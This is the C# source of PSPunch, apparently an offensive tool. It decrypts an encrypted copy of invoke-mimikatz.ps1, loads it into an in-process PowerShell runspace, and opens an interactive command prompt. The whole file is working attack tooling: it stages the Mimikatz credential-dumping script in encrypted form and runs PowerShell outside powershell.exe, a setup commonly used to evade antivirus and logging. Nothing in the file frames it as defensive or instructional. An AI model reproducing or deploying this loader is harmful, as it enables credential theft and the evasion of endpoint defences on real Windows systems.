using PSPunch.PSPunchShell;
using System;
using System.Configuration;
using System.Management.Automation.Runspaces;
using PSPunch.CryptUtil;
using System.IO;
using System.Text;

namespace PSPunch
{
    class Program
    {
        public static void ImportModules(Runspace runspace)
        {
            string decFile = Utils.GetPSPunchDir() + "\\invoke-mimikatz.ps1.enc";
            string key = Utils.GenerateKey();
            MemoryStream decMem = FileTools.DecryptFile(decFile, key);
            string module = Encoding.Unicode.GetString(decMem.ToArray());
            using (Pipeline pipeline = runspace.CreatePipeline())
            {
                pipeline.Commands.AddScript(module);
                pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                pipeline.Invoke();
            }
        }

        public static string PSExec(Runspace runspace, PSPunchHost host, string command)
        {
            using (Pipeline pipeline = runspace.CreatePipeline())
            {
                pipeline.Commands.AddScript(command);
                pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output); pipeline.Commands.Add("out-default");
                pipeline.Invoke();
            }
            return ((PSPunchHostUserInterface)host.UI).Output;
        }

        static void Main(string[] args)
        {
            PSPunchHost host = new PSPunchHost();
            Runspace runspace = RunspaceFactory.CreateRunspace(host);
            runspace.Open();
            ImportModules(runspace);
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.Clear();
            String cmd = null;
            while (cmd != "exit")
            {
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("PSPUNCH! #> ");
                Console.ForegroundColor = ConsoleColor.Yellow;
                cmd = Console.ReadLine();
                string output = PSExec(runspace, host, cmd);
                Console.Write(output);
            }
        }
    }
}